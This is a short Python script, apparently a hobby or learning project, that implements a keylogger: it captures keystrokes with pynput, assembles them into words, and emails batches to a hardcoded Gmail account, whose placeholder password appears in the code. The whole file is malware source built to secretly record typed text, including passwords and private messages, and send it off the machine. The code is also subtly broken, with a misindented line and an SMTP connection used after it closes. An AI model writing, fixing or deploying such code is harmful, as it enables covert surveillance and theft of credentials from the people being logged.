import getpass
import smtplib,ssl

port = 465

from pynput.keyboard import Key, Listener

#email set-up
email = "keyloggeremailtester@gmail.com"
password = "passwordforkeylogger"
#keyloggeremailtester@gmail.com
#passwordforkeylogger
context = ssl.create_default_context()
#server = smtplib.SMTP_SSL('smtp.gmail.com',465,context=context)
with smtplib.SMTP_SSL('smtp.gmail.com',465,context=context) as server:
    server.login(email,password)

#logger
email_log = ''
word = ''
email_char_limit = 50

def on_press(key):
    global word
    global email_log
    global email
    global email_char_limit

    if key == Key.space or key == Key.enter:
        word += ' '
        email_log += word
        word = ''
        if len(email_log) >= email_char_limit:
            send_log()
            email_log = ''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
         word += char
        
    if key == Key.esc:
        return False

def send_log():
    server.sendmail(email,email,email_log)

with Listener(on_press=on_press) as listener:
    listener.join()